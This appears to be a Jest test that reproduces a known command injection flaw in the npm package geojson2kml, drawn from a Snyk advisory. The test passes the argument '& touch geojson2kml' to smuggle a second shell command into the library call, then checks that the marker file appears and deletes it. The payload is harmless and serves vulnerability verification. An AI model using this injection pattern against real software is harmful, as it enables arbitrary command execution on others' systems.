//https://snyk.io/vuln/SNYK-JS-GEOJSON2KML-1050412
test("Command Injection in geojson2kml", () => 
{
    const a =require("geojson2kml");
	const fs = require('fs')
	const path = './geojson2kml'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    a("./","& touch geojson2kml",function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});